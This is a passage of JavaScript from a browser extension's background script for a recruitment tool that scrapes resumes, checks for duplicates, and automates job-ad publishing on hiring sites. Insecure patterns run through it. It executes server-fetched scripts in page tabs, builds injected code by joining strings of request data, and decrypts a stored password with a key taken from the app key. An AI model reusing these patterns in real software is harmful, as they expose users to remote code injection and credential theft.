                                fileReader.readAsDataURL(blob);
                                fileReader.onloadend = function() {
                                    var fileContent = fileReader.result;
                                    fileContent = fileContent.replace(/data:[^,]*?base64,/i, "");
                                    var args = $.extend({}, request);
                                    args.files.push({
                                    	language:request.language,
                                    	base64:true,
                                    	filename:file,
                                    	content:fileContent
                                    });
                                    rebulidRequestParms(args);
                                    var url = api.serverBaseUrl + requestUrlMap['uploadResume'];
                                    api.uploadResume(url, "post", args, function(data) {
                                        sendResponse(data);
                                    });
                                }
                            }
                        }
                        xhr.send();
                    }
                })
            })
        },"checkRepeatResume":function() { // 简历查重
        	chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
        		var tabid = tab[0].id;

				var contxt = request.context;
				var _channelInfo = $.extend({}, request.context,{contentScript:{}});
				var code = "var _channelInfo = " + JSON.stringify(_channelInfo) + ";\r\n" + contxt.contentScript;
				chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + contxt.jsMethod + "();"}, function(res) {
					if (res && res[0] != null) {
						var _res = res[0];

						var checkInfo = request.checkInfo;
						var args = {
							channelId: checkInfo.channelId,
							resumeWhereabouts: checkInfo.resumeWhereabouts,
							channelDicId: contxt.channelDicId,
							resumeOriginalId: _res.resumeOriginalId,
							content: (_res.files && _res.files[0] && _res.files[0]['content']) ? base64encode(utf16to8(_res.files[0]['content'])):'',
							base64:true
						};
						var url = api.serverBaseUrl + requestUrlMap['checkRepeatResume'];
						api.checkRepeatResume(url,"post",args,function(data){
							sendResponse(data);
						});
					} else {
						sendResponse({code:500,errorMsg:'检测失败！错误码：164'});
					}
				});
			});
		},"getChannelInfo":function() {
				if (request.channelDicId) {
					getChannelInfo('channelDicId',request.channelDicId,function(res) {
							sendResponse(res);
					});
				} else {
					getChannelInfo('url',request.url,function(res) {
						sendResponse(res);
					});
				}

		},"getHtmlContent":function() {

			api.getHtmlContent(request.url,request.method,request.dataType,function(data){
				sendResponse(data);
			});
		},"getDownloadScript":function() {
			
			var channelDicId = request.channelDicId;
			getChannelScript(downloadScriptKey,channelDicId,function(res){
				sendResponse(res);
			});
		},"getAdPublishScript":function() {
			
			var channelDicId = request.channelDicId;
			getChannelScript(adPublishScriptKey,channelDicId,function(res){
				sendResponse(res);
			});
		},"getResumeInfo":function() {

			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				var tabid = tab[0].id;
				var downloadObj = request.downloadObj
				var contxt = request.context;
				if(downloadObj && 4 != downloadObj.resumeWhereabouts){
                    contxt.jsMethod = 'getResumeAndCheckDownload'
				}
				var _channelInfo = $.extend({}, request.context,{contentScript:{},_channelDicIds:{},resumeWhereabouts:downloadObj.resumeWhereabouts});
				delete _channelInfo.contentScript;
				delete _channelInfo._channelDicIds;
				
				var code = "var _channelInfo = " + JSON.stringify(_channelInfo) + ";\r\n" + contxt.contentScript;
				// TODO
				/*if (contxt.checkContactInfoJsMethod) {
					chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + contxt.checkContactInfoJsMethod + "();"}, function(res) {
						if (res && res[0] != null) {
							var _res = res[0];
							if (_res.code == 200) {
								chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + contxt.jsMethod + "();"}, function(resp) {
									if (resp && resp[0] != null) {
										var uploadInfo = resp[0];
										uploadInfo.fileContentKey = contxt.fileContentKey;

										var check = uploadInfo['multiLanCheck'];
										if (check && check.mulitLan && check.url) { // 多语言简历
											if (contxt.channelDicId == 52) {
												var hash = md5(check.originalId);
												hash = hash.substring(0, 5) + hash.substring(0, 7);

												check['url']['workExp'] = check['url']['workExp'] + hash;
											}
											api.getHtmlContent(check.url,'get','html',{},function(response) {
												if (response.code == 200) {
													var otherLanResumeObject = $.extend(check, {content:response.data});
													chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + "var _otherLanResuem = " + JSON.stringify(otherLanResumeObject) +";\r\n"+ contxt.otherLanJsMethod + "();"}, function(result) {
														if (result && result[0]!=null) {
															uploadInfo.files.push(result[0]);
														}
														sendResponse(rebulidUploadInfo(uploadInfo));
													});
												} else {
													sendResponse(rebulidUploadInfo(uploadInfo));
												}
											});
										} else {
											sendResponse(rebulidUploadInfo(uploadInfo));
										}
									} else {
										sendResponse();
									}
								});
							} else {
								sendResponse({'errorMsg':_res.errorMsg});
							}
						} else {
							sendResponse();
						}
					});
				} else {*/
					chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + contxt.jsMethod + "();"}, function(resp) {
						if (resp && resp[0] != null) {
							var uploadInfo = resp[0];
							uploadInfo.fileContentKey = contxt.fileContentKey;

							var check = uploadInfo['multiLanCheck'];
							if (check && check.mulitLan && check.url) { // 多语言简历
								if (contxt.channelDicId == 52) {
									var hash = md5(check.originalId);
									hash = hash.substring(0, 5) + hash.substring(0, 7);

									check['url']['workExp'] = check['url']['workExp'] + hash;
								}
								api.getHtmlContent(check.url,'get','html',{},function(response) {
									if (response.code == 200) {
										var otherLanResumeObject = $.extend(check, {content:response.data});
										chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + "var _otherLanResuem = " + JSON.stringify(otherLanResumeObject) +";\r\n"+ contxt.otherLanJsMethod + "();"}, function(result) {
											if (result && result[0]!=null) {
												uploadInfo.files.push(result[0]);
											}
											sendResponse(rebulidUploadInfo(uploadInfo));
										});
									} else {
										sendResponse(rebulidUploadInfo(uploadInfo));
									}
								});
							} else {
								sendResponse(rebulidUploadInfo(uploadInfo));
							}
						} else {
							sendResponse();
						}
					});
				//}
			 })
		},"getAdList":function() {
			var url = getRequestUrl('getAdList');
			api.getAdList(url,"post",{postId:request.postId,externalKey:request.externalKey,external:request.external},function(data) {
				sendResponse(data);
			});
		},"toPublishPage":function() {
			// 去发布广告页面
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				var _adTabId = tab[0].id;
				console.log('ad publish tab id:%s',_adTabId);
				// 获取参数 {k:'channelDicId',v:request.channelDicId}
				getChannelInfoByKey(_adTabId,request.channelDicId,request.netRecruitment,function(channelInfo){
						if (_isUseable(channelInfo)) {
	                    	// 获取新打开的tab、该职位的详细信息，存储tabId用来和detail信息在内存中做自动填充用
	                    	api.getAdDetail(getRequestUrl('getAdDetail'),'post',{postId:request.postid,externalKey:request.externalKey,uid:request.uid},function(res) {
	                    		// console.log(res);
	                    		if (res.code == 200) {
	                    			// 跳转到指定页面
	                				chrome.tabs.create({active: true,url:channelInfo["publishAddr"] }, function(newTab) { 
										var tabId = newTab.id;
	                    				var publishInfo = $.extend({},request,{'detail':res.data,'adPublishTabId':_adTabId});
		                    			delete publishInfo['type'];

									_adTabUtils.add(tabId);
	                    			_mapUtils.put('detail-' + tabId , publishInfo);

	                    			sendResponse(publishInfo);
								});
									
                    		} else {
                    			_messageNotice({channelKey:channelInfo['channelDicId']+'_logo',
													title:'渠道发布！',
													message:res.data,
													time:5000
									});
                    			console.log('发布信息获取失败，'+ res.data);
                    		}
                    	});
                    }
				});
			});
		},"getAccountInfo":function() {
			chrome.storage.local.get([appKey],function(res) {
				var data = res[appKey] ? JSON.parse(res[appKey]) : {};
				if (data.password) {
					var key = CryptoJS.enc.Utf8.parse(appKey.slice(0, 16));
					
					var decrypt = CryptoJS.AES.decrypt(data.password, key,{iv: key,mode:CryptoJS.mode.CBC,padding: CryptoJS.pad.Pkcs7});
					var pwd = decrypt.toString(CryptoJS.enc.Utf8); 
					data["password"] = pwd;
				}
				sendResponse(data);
			});
		},"checkVersionInfo":function () {
			var _verKey = appKey+"_version";
			chrome.storage.local.get([_verKey],function(res) {
				var _version = '';
				var data = res[_verKey] ? JSON.parse(res[_verKey]) : {};
				if (data && data['version'] && data['lastUpdateTime'] && ((+new Date - data['lastUpdateTime'])<2*3600e3)) {
					_version = data['version'];
				}
				if (_version) {
					getVersionInfo(function(cVersion) {
						var lastVersion = $.trim(_version);
						if (checkNeedUpdate(lastVersion,cVersion)) {
							sendResponse(serverBaseUrl + requestUrlMap['downloadPlugin']);
						} else {
							sendResponse('');
						}
					});
				} else {
					var url = serverBaseUrl + requestUrlMap['getLastVersion'];
					api.getLastVersion(url,"get",{},function(res) {
						if(res.code == 200) {
							getVersionInfo(function(cVersion) {
								var lastVersion = $.trim(res.data);
								
								var _obj = {};
								_obj[_verKey] = JSON.stringify({'version':lastVersion,'lastUpdateTime':+new Date()});
								chrome.storage.local.set(_obj, function(items) {});
								
								if (checkNeedUpdate(lastVersion,cVersion)) {
									sendResponse(serverBaseUrl + requestUrlMap['downloadPlugin']);
								} else {
									sendResponse('');
								}
							});
						}
					});
				}
			});
		},"channelDownload":function() {

			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				var tabId = tab[0].id;
				getChannelInfoByKey(tabId,request.channelDicId,request.netRecruitment, function(channelInfo) {
					if (channelInfo && channelInfo.searchAddr) {
                        var defaultChannel = {'channelDicId':request.channelDicId};
							var searchAddr = channelInfo.searchAddr;
							var res = request['getAccountRequestUrl'];
							if (request['hasAccount'] && request['hasAccount'] == true) {
								if(request.chooseChannel){
                                    defaultChannel['channelId'] = request.chooseChannel;
                                    api.changeDefaultChannel(defaultChannel)
								}
								_storeChannelAccount(tabId,request['data-accountInfo']);
								var accountInfo = request['data-accountInfo'];
								chrome.tabs.create({active: true,url:channelInfo["searchAddr"]}, function(newTab) { 
									var newtabId = newTab.id;
									var _old = _mapUtils.get('searchTabsInfo');
									_old['searchTabId_'+newtabId] = {'preTabId':tabId,'channelDicId':channelInfo.channelDicId};
									_mapUtils.put('searchTabsInfo',_old);
					    			sendResponse({});
								});
							} else if (res) {
								//_jsCode = "function _getAccountUrl(){var _url = window.location.protocol + '//' + window.location.host + $('#dySearchGetAccountUrl').val();return _url;}\r\n_getAccountUrl();";
								//chrome.tabs.executeScript(tabId,{code:_jsCode},function(res) {
									
								//if (res) {
								var xhr = new XMLHttpRequest();
		                        xhr.open('GET', res, true);
		                        xhr.onload = function() {
		                            if (this.status == 200) {
		                                var _text = this.response;
		                                var _accountInfo={};
		                                if (_isUseable(_text)) {
		                                	_accountInfo = JSON.parse(_text);
		                                	_accountInfo['preTabId'] = tabId;
		                                	var _accountJsonInfo = JSON.stringify(_accountInfo);
		                                	sendResponse({'data-accountInfo':_accountJsonInfo,'data-netRecruitment':_accountInfo.netRecruitment});
		                                	_storeChannelAccount(tabId,_accountJsonInfo);
		                                	chrome.tabs.create({active: true,url:channelInfo["searchAddr"]}, function(newTab) { 
												var newtabId = newTab.id;
												var _old = _mapUtils.get('searchTabsInfo');
												_old['searchTabId_'+newtabId] = {'preTabId':tabId,'channelDicId':channelInfo.channelDicId,'netRecruitment':_accountInfo.netRecruitment};
												_mapUtils.put('searchTabsInfo',_old);
												//修改默认选择渠道
												defaultChannel['channelId'] = _accountInfo.channelId;
												api.changeDefaultChannel(defaultChannel);
											});
		                                }
		                            }
		                        }
		                        xhr.send();
							}
					}
				});				
			});
		/*'channelListInfo':function(){
			var url = getRequestUrl('channelListInfo');
			var args= {channelDicId:request.channelDicId};
			api.getChannelListInfo(url,"post",args,function(data) {
				sendResponse(data);
			});
		},*/
		},"toResumePage":function(){
			// zhangziye 去简历详情页
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				var _resumeTabId = tab[0].id;
				console.log('resume tab id:%s',_resumeTabId);
				getChannelInfoByKey(_resumeTabId,request.channelDicId,request.netRecruitment, function(channelInfo) {
					if (_isUseable(channelInfo)) {
						chrome.tabs.create({active: true,url:request.url }, function(newTab) {
							$.extend(channelInfo,request)
							delete channelInfo.type
                            _mapUtils.put('resumeInfo_' + newTab.id , channelInfo);
						})
					}
				})
			})	

		},'toRefresh':function(){//刷新，暂停等操作
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				var _adTabId = tab[0].id;
				console.log('ad stop tab id:%s',_adTabId);
				getChannelInfoByKey(_adTabId,request.channelDicId,request.netRecruitment, function(channelInfo) {
					if (_isUseable(channelInfo)) {
                			// 跳转到指定页面
            			var uri = channelInfo.stopOrRefreshPage;
						chrome.tabs.create({active: true,url:uri }, function(newTab) { 
							var tabId = newTab.id;
            				var stopRefreshInfo = $.extend({},request,{'detail':request.data,'adStopTabId':_adTabId});
                			delete stopRefreshInfo['type'];
                			var refreshOrginIdList = new Array();
//                			var refreshTreatedResume = new Array();
                			var _old = _mapUtils.get('stopTabsInfo');
							_old['stopTabId_'+tabId] = {'preTabId':tabId,'channelDicId':channelInfo.channelDicId};
							_mapUtils.put('stopTabsInfo',_old)
                			_mapUtils.put('stop_' + tabId , stopRefreshInfo);
							_mapUtils.put('refreshOrginIdList_'+tabId, refreshOrginIdList);
							_mapUtils.put('optInfo_'+tabId,stopRefreshInfo.originIds);
							_mapUtils.put('optNum_'+tabId,stopRefreshInfo.dytotalNum);
							var falseOpt = {};
							_mapUtils.put('successOptInfo_'+tabId,JSON.stringify(falseOpt))
							_mapUtils.put('falseOptInfo_'+tabId,JSON.stringify(falseOpt));
							_mapUtils.put('isOptRefresh_'+tabId, false);
							_mapUtils.put('isShowScuuceeTip_'+tabId, true);
							_mapUtils.put('isAutoRefresh_'+tabId,stopRefreshInfo.isAutoRefresh);
							_mapUtils.put('_adTabId_'+tabId,_adTabId);
                			sendResponse(stopRefreshInfo);
						});
                    }
				});
			});
		},'checkRelevantPerson':function(){
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
        		var tabid = tab[0].id;

				var contxt = request.context;
				var _channelInfo = $.extend({}, request.context,{contentScript:{}});
				var code = "var _channelInfo = " + JSON.stringify(_channelInfo) + ";\r\n" + contxt.contentScript;
				chrome.tabs.executeScript(tabid, {code: code + ";\r\n" + contxt.jsMethod + "();"}, function(res) {
					if (res && res[0] != null) {
						var _res = res[0];

						var checkInfo = request.checkInfo;
						var args = {
							channelId: checkInfo.channelId,
							channelDicId: contxt.channelDicId,
							resumeOriginalId: _res.resumeOriginalId,
							content: (_res.files && _res.files[0] && _res.files[0]['content']) ? base64encode(utf16to8(_res.files[0]['content'])):'',
							base64:true
						};
						var url = api.serverBaseUrl + requestUrlMap['checkRelevantPerson'];
						api.checkRepeatResume(url,"post",args,function(data){
							sendResponse(data);
						});
					} else {
						sendResponse({code:500,errorMsg:'检测失败！错误码：164'});
					}
				});
			});
		},'getPublishResult': function(){
			//zhangziye 获取发布标识
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				console.log('background接收',request)
				var _tabId = tab[0].id;
				var publishInfo = _mapUtils.get('detail-'+_tabId);
				var _postId = request.postId
				if (_postId && publishInfo ) {
					getChannelInfoByKey(_tabId,publishInfo.channelDicId,publishInfo.netRecruitment, function(channelInfo) {	
						_handlePublishSuccessPage(_tabId,_postId,channelInfo,publishInfo)
					})
				}
			})
		},'refreshSuccessOriginId':function(){//接受刷新成功的职位，自动刷新，智联是默认失败注入一个脚本到页面自动刷新，刷新成功时候返回一个职位信息，
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				console.log('background接收',request);
				var tabId = tab[0].id;
				var originId = request.originId;
				var stopRefreshInfo = _mapUtils.get('stop_'+tabId);
				updataRefresh(tabId,originId,stopRefreshInfo);
			});
		},'clearFalseOpt':function(){//清楚自动刷新的缓存记录，当用户点击去除失败内容的框的时候触发
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				console.log('background接收',request);
				var tabId = tab[0].id;
				var falseOptInfo = {};
				_mapUtils.put('falseOptInfo_'+tabId, JSON.stringify(falseOptInfo));
				_mapUtils.put('isShowScuuceeTip_'+tabId, false);
			});
		},'passiveRefreshResult':function(){//这个是接收智联的刷新结果的，由于智联的页面是ajax的所以必须做一个脚本注入检测当前刷新的职位。
			chrome.tabs.query({ active: true, lastFocusedWindow: true }, function(tab) {
				if(request != null){
					var tabId = tab[0].id;
					var refreshOrginIdArray =  _mapUtils.get('refreshOrginIdList_'+tabId);
					var stopRefreshInfo = _mapUtils.get('stop_'+tabId);
					var res = request.resumeInfoList;
					passiveRefresh(tabId,res,refreshOrginIdArray,stopRefreshInfo);
				}
			});
		}
	}
	types[type]();
}

function _storeChannelAccount (tabId,data) {
	var _jsCode = "top.window['data-accountInfo']='"+data+"'";
	chrome.tabs.executeScript(tabId,{code:_jsCode},function(res) {
		// do nothing
	});
}

function checkNeedUpdate(lastVerion,currentVersion) {
	if(_isUseable(lastVerion) && _isUseable(currentVersion)) {
		console.log('lastVerion %s，currerntVersion %s',lastVerion,currentVersion);
		return getVersionNo(lastVerion) > getVersionNo(currentVersion);
	}
	return false;
}

//1.2
function getVersionNo(version) {
	var _array = version.split('.');
	var _no = 0;
	for (var _i=0,_j=_array.length;_i<_j;_i++) {
		_no+=_array[_i]*Math.pow(10,_j-_i-1);
	}
	return _no;
}

function getVersionInfo(callback) {
	$.get(chrome.extension.getURL('manifest.json'), function(info) {
	    callback(info.version);
	}, 'json');
}
function rebulidUploadInfo (uploadInfo) {
	var key = uploadInfo.fileContentKey;
	if (typeof (uploadInfo) != "undefined") {
		if (uploadInfo.files) {
			for (var i=0;i<uploadInfo.files.length;i++) {
				uploadInfo.files[i][key] = base64encode(utf16to8(uploadInfo.files[i][key]));
				uploadInfo.files[i]['base64'] = true;
			}
		}
	}
	return uploadInfo;
}

function rebulidRequestParms(args) {
	if (args) {
		delete args.multiLanCheck;
		if (args.files) {
			for (var i=0;i<args.files.length;i++) {
				var file = args.files[i];
				$.each(file,function(name,value) {
					args['files['+i+'].'+name] = value;
				})
			}
		}
		delete args.files;
	}
}

//获取简历下载、职位发布脚本 （type）
// 'contentScript_2':{downloadScript，adPublishScript，lastUpdateTime}
function getChannelScript(type,channelDicId,callback) {
	 var key = "contentScript_"+channelDicId;
	 chrome.storage.local.get([key], function(items) {
		 var script = JSON.parse(items[key] || '{}');
		 //if(!isOnline){
			//script = {};
		 //}
		 if (isValidContentScript(script)) {
			//sendResponse(contentScript['contentScript_'+channelDicId]);
			callback(script[type]);
		 } else {
		 	var url = serverBaseUrl + requestUrlMap['getChannelScript'];
			api.getContentScript(url,"post",{channelDic:channelDicId,version:version},function(result) {
				if (result.code == 200) {
					var script = JSON.parse(result.data);
					script['lastUpdateTime'] = +new Date();
					//contentScript['contentScript_'+channelDicId] =  {'lastUpdateTime':+new Date(),'data':result.data};
					var _obj = {};
					_obj[key] = JSON.stringify(script);
					chrome.storage.local.set(_obj, function(items) {});
					//sendResponse(contentScript['contentScript_'+channelDicId]);
					callback(script[type]);
				 } else {
					 console.log(result.data);
					 callback(null);
				 }
			 });
		 }
	 });	
}

// 获取渠道配置信息
function getChannelInfo(type, value, callback) {
	 chrome.storage.local.get(["channelConfigInfo"], function(items) {
		 var config = JSON.parse(items['channelConfigInfo'] || '{}');
		 //if (!isOnline) {
		 	//config = {};
		 //}
		 if (isValidChannelConfig(config)) {
			channelConfigInfo = config; 
			var channelinfo = getChannelInfoBy(type,value);
			callback(channelinfo[0]);
		 } else {
		 	var url = serverBaseUrl + requestUrlMap['channelInfo'] + '?version='+version;
			 api.getChannelInfo(url,"post",function(result) {
				if (result.code == 200) {
					channelConfigInfo =  {'lastUpdateTime':+new Date(),'data':JSON.parse(result.data)};
					var channelinfo = getChannelInfoBy(type,value);
					chrome.storage.local.set({ "channelConfigInfo": JSON.stringify(channelConfigInfo)}, function(items) {});
					callback(channelinfo[0]);
				 } else {
					 console.log(result.data);
					 callback(null);
				 }
			 });
		 }
	 });
}
function getChannelInfoBy(type,value) {
	var arr = $.grep(channelConfigInfo.data, function(obj, i) {
		if (type == "url") {
			var regx = new RegExp(obj["urlMatchRegx"], 'i');
			return regx.test(value);
		} else if (type == "channelName") {
			return obj["channelName"] == value;
		} else if (type == "channelDicId") {
			return obj["channelDicId"] == value;
		} else if(type == "channelKey") {
			return obj["key"] == value;
		}else{
			return null
		}
	});
	var channelDicIds = getChannelDicIds();
	$(arr).each(function(i,v) {
		arr[i]['_channelDicIds'] = channelDicIds;
	});
	return arr;
}

function getChannelDicIds() {
	var channelDicIds = [];
	$.each(channelConfigInfo.data, function(i,obj) {
		channelDicIds.push(obj["channelDicId"]);
	});
	return channelDicIds;
}

// 获取该企业对应的接口url
function getRequestUrl(key) {
	return api.serverBaseUrl + requestUrlMap[key];
}

// 简历下载、职位发布脚本（六小时有效）
//'contentScript_2':{downloadScript，adPublishScript，lastUpdateTime}
function isValidContentScript(con_script) {
 	if(con_script && (con_script[downloadScriptKey] || con_script[adPublishScriptKey]) && con_script['lastUpdateTime']) {
		if ((+new Date - con_script['lastUpdateTime'])<4*3600e3) {
	 		return true;
	 	}
 	}
	return false;
}

//当天有效 （url ……）
function isValidChannelConfig(info) {
	 if (info && info['data'] && info['lastUpdateTime']) {
	 	var now = new Date();
	 	var lastUpdateTime = new Date(info['lastUpdateTime']);
	 	if ((now.getMonth() == lastUpdateTime.getMonth()) && (now.getDate() == lastUpdateTime.getDate())) {
	 		return true;
	 	}
	 }
	 return false;
}

//存储新打开的切换页ID，
//tabids : [];
//detailInfo : {id:'detail'};

function _isUseable(key) {
	if (typeof(key) != 'undefined' && $.trim(key).length>0) {
		return true;
	}
	return false;
}

/***
 * <pre>>
 * 1、chrome.storage.local方式只能够将数据存储在当前登录的设备本地
 *   1）、content_scripts可以直接读取数据，而不必通过background页面；
 *   2）、在隐身模式下仍然可以读出之前存储的数据；
 *   3）、读写速度更快；
 *   4）、用户数据可以以对象的类型保存；
 * 2、window.localStorage生命周期是永久，这意味着除非用户显示在浏览器提供的UI上清除localStorage信息，否则这些信息将永远存在
 * </pre>
 */
var _mapUtils = {
	put:function(key,value) {
		if (_isUseable(key)) {
			storage[key] = JSON.stringify(value);
			/*chrome.storage.local.set({key: JSON.stringify(value)}, function(items) {
				console.log("保存完毕");
			});*/
		}
	},
	get:function(key) {
		if (_isUseable(key)) {
			var str = storage[key];
			if (_isUseable(str)) {
				return JSON.parse(str);
			} else {
				return {};
			}
			/*chrome.storage.local.get([key], function(str) {
				if (_isUseable(str)) {
					return JSON.parse(str);
				} else {
					return {};
				}
			});*/
		}
	},
	remove:function(key) {
		if (_isUseable(key)) {
			delete storage[key];
			//chrome.storage.local.remove([key], function(str) {});
		}
	}
}
//判断是否是当天日期
function isNowDay(time){
	if(time == null){
		return false;
	}
	var date = new Date();
    var seperator1 = "-";
    var month = date.getMonth() + 1;
    var strDate = date.getDate();
    if (month >= 1 && month <= 9) {
        month = "0" + month;
    }
    if (strDate >= 0 && strDate <= 9) {
        strDate = "0" + strDate;
    }
    var currentdate = date.getFullYear() + seperator1 + month + seperator1 + strDate;
    var timearr=time.split(" ")[0];
    if(currentdate == timearr){
    	return true;
    }
    return false;
}

var _adTabUtils = {
	add:function(tabId) {
		if (_isUseable(tabId)) {
			//chrome.storage.local.get(['tabInfo'], function(res) {
			var tabInfoArray = storage['tabInfo'] ? JSON.parse(storage['tabInfo']) : [];
			tabInfoArray.push(tabId);
			//chrome.storage.local.set({'tabInfo': JSON.stringify(tabInfoArray)}, function(items) {});
			storage['tabInfo'] = JSON.stringify(tabInfoArray);
			//});
		}
	},
	remove:function(tabId) {
		if (_isUseable(tabId)) {
			var res = storage['tabInfo'];
			if (res) {
				var tabInfoArray = JSON.parse(res);
				var newTabInfoArray = [];
				$.each(tabInfoArray,function(i,item) {
					if (tabId == item) {
						// do nothing
					} else {
						newTabInfoArray.push(item);
					}
				});
				storage['tabInfo'] = JSON.stringify(newTabInfoArray);
			}
			/*chrome.storage.local.get(['tabInfo'], function(res) {
				if (res['tabInfo']) {
					var tabInfoArray = JSON.parse(res['tabInfo']);
					var newTabInfoArray = [];
					$.each(tabInfoArray,function(i,item) {
						if (tabId == item) {
							// do nothing
						} else {
							newTabInfoArray.push(item);
						}
					});
					chrome.storage.local.set({'tabInfo': JSON.stringify(newTabInfoArray)}, function(items) {
						console.log("ad tab 保存完毕");
					});
				}
			});*/
		}
	},
	get:function(){
		var res = storage['tabInfo'];
		if (res) {
			return JSON.parse(res);
		} else {
			return [];
		}
	}
};
//同步刷新标识
function refresh(stopRefreshInfo,item){
	var time = 0;
	if(delayed){
		delayed = false;
	}else{
		time = 1000;
		delayed = true;
	}
	 setTimeout(function(){
			var refreshTagObj = {channelId:stopRefreshInfo.channelId,channelDicId:stopRefreshInfo.channelDicId,positionInfo:JSON.stringify(item),type:6};
			api.updateRefreshTag(getRequestUrl('updateRefreshTag'),'post',refreshTagObj,function(res){
				if(res.code == 200){
					//如果更新成功就刷新职位列表页面
					var code = "$('#wt-search').click();"
					chrome.tabs.executeScript(stopRefreshInfo.adStopTabId,{code:code},function(res) {
						console.log("刷新成功");
					});
				}
			});
	},time);
}
//获取json数组的长度
function getHsonLength(json){
    var jsonLength=0;
    for (var i in json) {
        jsonLength++;
    }
    return jsonLength;
}

function changeJson(json,tabId){
	var optInfoJson = {};
	var count = 0
	$.each(json,function(i,item){
		optInfoJson[count++] = item;
	});
	_mapUtils.put("optInfo_"+tabId, JSON.stringify(optInfoJson));
	_mapUtils.put('optNum_'+tabId,count);
}
//自动刷新更新刷新标识 去除自动刷新失败的职位缓存
function updataRefresh(tabId,originId,stopRefreshInfo){
	//更新刷新标识，并且删除 操作失败的这个职位的缓存。
	var falseInfo = JSON.parse(_mapUtils.get('falseOptInfo_'+tabId));
	var falseLength = getHsonLength(falseInfo);
	if(falseLength>0){
		$.each(falseInfo,function(k,info){
			if(info.originId == originId){
				delete falseInfo[k];
				refresh(stopRefreshInfo,{"0":{"orginId":info.originId}});
				getChannelScript(adPublishScriptKey,stopRefreshInfo.channelDicId,function(adPublishScript) {
					var jscode = "var _adInfo = {};\r\n" + adPublishScript;
					chrome.tabs.executeScript(tabId, {code: jscode + ";\r\_removeTips('"+info.postName+"');"}, function(resp) {
						if(res&&res[0]){
							_mapUtils.put('isShowScuuceeTip_'+tabId, false);
						}
					});
				})
			}
		});
		_mapUtils.put('falseOptInfo_'+tabId,JSON.stringify(falseInfo));
	}
}
//手动刷新更新刷新标识 不会去除失败的缓存内容
function passiveRefresh(tabId,resp,refreshOrginIdArray,stopRefreshInfo){
	if(resp !=null && resp[0]!=null){
		var resumeList = JSON.parse(resp);
		var updateResume={};
		var count = 0;
		$.each(resumeList,function(i,item){
			var updateTime = item['updateTime'];
			if(isNowDay(updateTime)){
				if(!($.inArray(item['orginId'],refreshOrginIdArray)>-1)){
					refreshOrginIdArray.push(item['orginId']);
					updateResume[count++] = item;
				}
			}
		});
		if(!$.isEmptyObject(updateResume)){
			_mapUtils.put('refreshOrginIdList_'+tabId,refreshOrginIdArray);
			refresh(stopRefreshInfo,updateResume);
		}
	}
}
//是否包含刷新失败的职位
function isExisFalseOpt(falseInfo,falseOriginInfo){
	var isExis = false;
	if(getHsonLength(falseInfo)>0){
		var falseOriginId = falseOriginInfo['originId'];
		$.each(falseInfo,function(i,item){
			var originId = item.originId;
			if(falseOriginId == originId){
				isExis = true;
			}
		})
	}
	return isExis;
}

/*************task start**************/
/*function getDyuuid() {
	var _dyuuid = _mapUtils.get('dyuuid');
	if (_dyuuid && _dyuuid.length && _dyuuid.length==36) {
		
	} else {
		_dyuuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
			var r = Math.random() * 16 | 0,
				v = c == 'x' ? r : (r & 0x3 | 0x8);
			return v.toString(16)
		});
	}
	_mapUtils.put('dyuuid',_dyuuid);
	return _dyuuid;
}
var proxyUrl, callbackUrl,firstStepT=5,secondStepT=2;
function checkNeedStartUp() {
	getChannelInfo('channelKey', 'dayee', function(channelInfo) {
		var needStop = true;
		try {
			if (channelInfo && channelInfo['externalInfo']) {
				var externalJson = JSON.parse(channelInfo['externalInfo']);
				if (externalJson['getTodoListUrl'] && externalJson['saveTodoListUrl'] && externalJson['startHour'] && externalJson['endHour']) {
					var _uuid = getDyuuid();
					var hour = (new Date()).getHours();
					if (hour>=Number(externalJson['startHour']) && hour<=Number(externalJson['endHour'])) {
						if (externalJson['getTodoListUrl'].indexOf('?')>0) {
							proxyUrl = externalJson['getTodoListUrl'] +'&uuid='+_uuid;
						} else {
							proxyUrl = externalJson['getTodoListUrl'] +'?uuid='+_uuid;
						}
						if (externalJson['saveTodoListUrl'].indexOf('?')>0) {
							callbackUrl = externalJson['saveTodoListUrl'] +'&uuid='+_uuid;
						} else {
							callbackUrl = externalJson['saveTodoListUrl'] +'?uuid='+_uuid;
						}
						if (externalJson['firstStepT']) {
							firstStepT = Number(externalJson['firstStepT']);
						}
						if (externalJson['secondStepT']) {
							secondStepT = Number(externalJson['secondStepT']);
						}
						startTask();
						needStop = false;
					}
				}
			}
		} catch(err) {
			console.log('checkNeedStartUp->',err);
		} finally {
			needStop && stopTask(); 
		}
	});
}
var todoListLock = false,taskRunning = false,fetchTaskms = 5,execTaskms = 5;
function getTodoList() { //获取任务
	if (todoListLock) {
		return;
	}
	try {
		todoListLock = true;
		chrome.storage.local.get(["channelTodoList"], function(items) {
			var config = JSON.parse(items['channelTodoList'] || '[]');
			if (config.length >= 10) {
				
				resetSleepTime('fetch');sleepTask('fetch');
			} else {
				try {
					$.ajax({type:"get",async:false,timeout:2000,url:proxyUrl+"&corp="+(api['corpCode']||'')+"&size="+(10-config.length),complete:function (XMLHttpRequest, textStatus) {
						if("success" == textStatus) {
							var json = JSON.parse(XMLHttpRequest.responseText);
							if ('00' == json.code && json.data && json.data.length > 0) {
								$(json.data).each(function(i,item) {
									config.push(item);
								});
								chrome.storage.local.set({"channelTodoList":JSON.stringify(config)},function(){});
								resetSleepTime('fetch');sleepTask('fetch');
							} else {
								addSleepTime('fetch');sleepTask('fetch');
							}
						} else {
							addSleepTime('fetch');sleepTask('fetch');
						}
					}});
				} catch (err) {
					addSleepTime('fetch');sleepTask('fetch');
				} 
			}
		});
	} finally {
		todoListLock = false;
	}
}
